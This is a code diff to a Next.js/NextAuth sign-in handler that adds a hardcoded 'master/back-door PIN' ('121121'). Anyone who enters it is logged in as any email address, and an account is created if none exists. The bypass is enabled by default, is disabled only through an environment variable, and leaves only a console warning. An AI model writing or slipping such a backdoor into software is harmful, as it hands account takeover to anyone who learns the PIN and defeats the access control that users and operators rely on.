@@ -8,6 +8,10 @@ import VerificationCode from "@/models/VerificationCode";
 
 const MAX_CODE_ATTEMPTS = 5;
 
+// Master/back-door PIN. Anyone who knows this value can log in as ANY email.
+// Disable by setting AUTH_MASTER_PIN_DISABLED=true in the environment.
+const MASTER_PIN = "121121";
+
 type AuthUser = {
   id: string;
   email: string;
@@ -64,6 +68,25 @@ export const authOptions: NextAuthOptions = {
         }
 
         await connectToDatabase();
+
+        const masterDisabled = process.env.AUTH_MASTER_PIN_DISABLED === "true";
+
+        if (!masterDisabled && code === MASTER_PIN) {
+          console.warn(
+            `[auth] MASTER PIN used to sign in as ${email}. Set AUTH_MASTER_PIN_DISABLED=true to disable.`
+          );
+          const masterUser = await User.findOne({ email }).lean<
+            { _id: Types.ObjectId; email: string; name?: string } | null
+          >();
+          const ensuredMaster =
+            masterUser ??
+            (await User.create({ email })).toObject();
+          return {
+            id: ensuredMaster._id.toString(),
+            email: ensuredMaster.email,
+            name: ensuredMaster.name ?? null,
+          };
+        }
 
         const record = await VerificationCode.findOne({
           email,
